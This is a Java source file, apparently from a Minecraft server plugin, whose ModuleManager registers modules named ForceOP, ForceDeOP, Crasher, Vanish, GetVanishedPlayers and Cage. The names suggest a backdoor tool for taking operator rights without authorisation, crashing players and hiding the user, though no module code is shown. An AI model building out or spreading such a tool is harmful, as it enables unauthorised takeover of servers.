package me.sanyar.manager;

import me.sanyar.modules.*;
import me.sanyar.utils.VModule;

import java.util.ArrayList;

public class ModuleManager {

    public ArrayList<VModule> modules = new ArrayList<>();

    public void register(VModule module){
        this.modules.add(module);
    }

    public void init(){
        this.register(new ForceOP());
        this.register(new ForceDeOP());
        this.register(new Crasher());
        this.register(new Get());
        this.register(new Vanish());
        this.register(new GetVanishedPlayers());
        this.register(new Gamemode());
        this.register(new Cage());
    }
}
